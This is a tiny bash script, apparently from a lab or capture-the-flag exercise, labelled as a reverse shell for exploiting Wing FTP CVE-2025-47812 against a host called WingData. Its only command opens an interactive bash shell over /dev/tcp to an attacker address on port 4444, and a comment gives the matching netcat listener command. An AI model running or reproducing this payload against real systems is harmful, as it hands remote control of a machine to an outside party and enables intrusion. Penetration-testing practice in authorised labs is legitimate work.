#!/bin/bash
# Shell: Bash Reverse Shell via Wing FTP CVE-2025-47812
# Target: WingData (10.129.4.107)
# Listener: nc -lvnp 4444
# Usage: bash revshell_bash.sh

bash -i >& /dev/tcp/10.10.14.35/4444 0>&1
